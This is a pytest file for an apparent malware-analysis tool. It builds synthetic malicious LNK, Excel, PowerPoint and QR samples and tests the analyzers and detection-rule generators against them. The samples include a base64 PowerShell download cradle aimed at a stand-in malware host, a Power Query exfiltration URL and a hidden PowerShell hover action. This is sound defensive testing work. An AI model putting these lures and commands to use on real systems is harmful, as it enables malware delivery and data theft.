import os
import io
import struct
import zipfile
import pytest
from app.analyzers.lnk_analyzer import LnkAnalyzer
from app.analyzers.qr_scanner import QRScanner
from app.analyzers.office_analyzer import OfficeAnalyzer
from app.analyzers.pcap_analyzer import PcapAnalyzer
from app.analyzers.executable_analyzer import ExecutableAnalyzer
from app.analyzers.detection_rules import DetectionRuleGenerator
from app.analyzers.identification import IdentificationAnalyzer
from app.core.job_manager import job_manager, JobModel
import yara

def test_lnk_dissection(tmp_path):
    # Construct synthetic LNK file with Base64 PowerShell and Trailing Overlay
    lnk_file = tmp_path / "invoice.pdf.lnk"
    
    # 76-byte ShellLinkHeader
    header_size = 0x0000004C
    clsid = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    # LinkFlags: HasLinkInfo (0x2) | HasArguments (0x20) | HasIconLocation (0x40) | IsUnicode (0x80)
    link_flags = 0x00000002 | 0x00000020 | 0x00000040 | 0x00000080
    file_attributes = 0x00000020 # ARCHIVE
    creation_time = 133500000000000000
    access_time = 133500000000000000
    write_time = 133500000000000000
    file_size = 450560
    icon_index = 0
    show_command = 7 # SW_SHOWMINNOACTIVE
    hotkey = 0
    reserved = b"\x00" * 10
    
    header = struct.pack("<I16sIIQQQIIIH2s4s4s",
        header_size, clsid, link_flags, file_attributes,
        creation_time, access_time, write_time,
        file_size, icon_index, show_command, hotkey, b"\x00"*2, b"\x00"*4, b"\x00"*4
    )
    
    # Minimal LinkInfo structure (28 bytes)
    # LinkInfoSize (4), LinkInfoHeaderSize (4), Flags (4), VolumeIDOffset (4), LocalBasePathOffset (4), ...
    base_path = b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\x00"
    link_info_hdr_size = 28
    local_base_offset = link_info_hdr_size
    link_info_size = link_info_hdr_size + len(base_path)
    link_info = struct.pack("<IIIIIII", link_info_size, link_info_hdr_size, 0x1, 0, local_base_offset, 0, 0) + base_path
    
    # String Data (Unicode utf-16le): Arguments & Icon Location
    cmd_args = '-nop -w hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA'
    encoded_args = cmd_args.encode('utf-16le')
    args_block = struct.pack("<H", len(cmd_args)) + encoded_args
    
    icon_loc = "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat.exe"
    icon_encoded = icon_loc.encode('utf-16le')
    icon_block = struct.pack("<H", len(icon_loc)) + icon_encoded
    
    # ExtraData Terminal Block (4 bytes of 0x00000000)
    terminal_block = b"\x00\x00\x00\x00"
    
    # Trailing Overlay (Appended secondary executable MZ payload)
    overlay_payload = b"MZ" + b"\x90" * 128 + b"This program cannot be run in DOS mode."
    
    full_lnk_content = header + link_info + args_block + icon_block + terminal_block + overlay_payload
    lnk_file.write_bytes(full_lnk_content)
    
    analyzer = LnkAnalyzer()
    res = analyzer.analyze(lnk_file, filename="invoice.pdf.lnk", mime_type="application/x-ms-shortcut")
    assert res.success is True
    data = res.data
    
    # Check Header
    assert data["header"]["show_command"] == 7
    assert data["header"]["clsid_matches"] is True
    
    # Check Arguments & Deobfuscation
    assert "powershell" in data["targets_and_paths"]["target_command"].lower()
    assert "encodedcommand" in data["targets_and_paths"]["arguments"].lower()
    assert data["deobfuscated_payload"] is not None
    assert "System.Net.WebClient" in data["deobfuscated_payload"]
    assert "http://malware.com/stage.ps1" in data["urls"]
    
    # Check LOLBins
    lolbin_names = [lb["binary"] for lb in data["lolbins"]]
    assert "powershell.exe" in lolbin_names
    
    # Check Icon Spoofing
    assert data["icon_spoofed"] is True
    assert "Acrobat" in data["icon_spoof_details"]
    
    # Check Overlay
    assert data["overlay"] is not None
    assert data["overlay"]["is_executable"] is True
    assert data["overlay"]["size"] == len(overlay_payload)


def test_qr_scanner_quishing(tmp_path):
    import qrcode
    from PIL import Image

    # Generate QR Code image
    qr = qrcode.QRCode(box_size=10, border=4)
    target_url = "https://login-microsoft-security-alert.attacker.org/auth"
    qr.add_data(target_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    
    img_path = tmp_path / "quishing_test.png"
    img.save(img_path)
    
    qr_records = QRScanner.scan_image_file(img_path)
    assert len(qr_records) > 0
    findings = QRScanner.generate_findings(qr_records, "quishing_test.png")
    decoded_urls = [qr["url"] for qr in qr_records if qr.get("url")]
    assert target_url in decoded_urls
    assert len(findings) > 0
    assert any("Quishing" in f.title for f in findings)


def test_excel_very_hidden_and_power_query(tmp_path):
    xlsx_file = tmp_path / "financial_audit.xlsm"
    
    workbook_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
        <sheets>
            <sheet name="Summary" sheetId="1" state="visible"/>
            <sheet name="BackdoorStaging" sheetId="2" state="veryHidden"/>
            <sheet name="HiddenNotes" sheetId="3" state="hidden"/>
        </sheets>
    </workbook>"""
    
    connections_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
        <connection id="1" name="C2Outbound">
            <dbPr command="let Source = Web.Contents(&quot;https://c2.threatgroup.com/exfil?d=secret&quot;) in Source"/>
        </connection>
    </connections>"""
    
    worksheet_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
        <sheetProtection sheet="1" password="1234"/>
        <sheetData>
            <row r="1" hidden="1"><c r="A1"><v>123</v></c></row>
        </sheetData>
    </worksheet>"""
    
    with zipfile.ZipFile(xlsx_file, "w") as zf:
        zf.writestr("xl/workbook.xml", workbook_xml)
        zf.writestr("xl/connections.xml", connections_xml)
        zf.writestr("xl/worksheets/sheet1.xml", worksheet_xml)
        zf.writestr("[Content_Types].xml", "<Types></Types>")
    
    analyzer = OfficeAnalyzer()
    res = analyzer.analyze(xlsx_file, filename="financial_audit.xlsm", mime_type="application/vnd.ms-excel.sheet.macroEnabled.12")
    assert res.success is True
    excel_info = res.data.get("excel_analysis")
    assert excel_info is not None
    assert len(excel_info["very_hidden_sheets"]) == 1
    assert excel_info["very_hidden_sheets"][0]["name"] == "BackdoorStaging"
    assert len(excel_info["power_query_queries"]) >= 1
    assert "https://c2.threatgroup.com/exfil?d=secret" in res.data["urls"]


def test_powerpoint_mouse_over_traps(tmp_path):
    pptx_file = tmp_path / "presentation.pptm"
    
    slide_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"
           xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
           show="0">
        <p:cSld>
            <p:spTree>
                <p:sp>
                    <p:spPr>
                        <a:hlinkHover action="ppaction://program?exec=powershell.exe -w hidden -enc AAA="/>
                    </p:spPr>
                </p:sp>
            </p:spTree>
        </p:cSld>
    </p:sld>"""
    
    with zipfile.ZipFile(pptx_file, "w") as zf:
        zf.writestr("ppt/slides/slide1.xml", slide_xml)
        zf.writestr("[Content_Types].xml", "<Types></Types>")
    
    analyzer = OfficeAnalyzer()
    res = analyzer.analyze(pptx_file, filename="presentation.pptm", mime_type="application/vnd.ms-powerpoint.presentation.macroEnabled.12")
    assert res.success is True
    ppt_info = res.data.get("powerpoint_analysis")
    assert ppt_info is not None
    assert len(ppt_info["hover_actions"]) == 1
    assert "ppaction://program" in ppt_info["hover_actions"][0]["action"]
    assert len(ppt_info["hidden_slides"]) == 1


def test_detection_rule_generation():
    fake_job_data = {
        "filename": "trojan_dropper.exe",
        "category": "executable",
        "mime_type": "application/x-dosexec",
        "file_size": 204800,
        "hashes": {
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "md5": "d41d8cd98f00b204e9800998ecf8427e",
            "imphash": "b349b142b35043581f30d93550725b79",
            "rich_header_hash": "a1b2c3d4e5f678901234567890abcdef"
        },
        "binary_info": {
            "suspicious_apis": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
        },
        "urls": ["http://c2-command-beacon.com/gate.php"],
        "mitre_attack": [{"technique_id": "T1055", "technique_name": "Process Injection"}]
    }
    
    rules = DetectionRuleGenerator.generate_all(fake_job_data)
    assert "yara_rule" in rules
    assert "sentinel_kql" in rules
    
    # Verify YARA rule compiles perfectly
    compiled_yara = yara.compile(source=rules["yara_rule"])
    assert compiled_yara is not None
    
    # Verify Microsoft Sentinel KQL queries are present
    kql = rules["sentinel_kql"]
    assert "mde_process_creation" in kql
    assert "windows_event_4688" in kql
    assert "mde_file_events" in kql
    assert "mde_network_c2" in kql
    assert "email_gateway" in kql
    assert "sentinel_analytics_rule" in kql
    
    # Verify indicators included in KQL
    assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in kql["mde_process_creation"]
    assert "c2-command-beacon.com" in kql["mde_network_c2"]
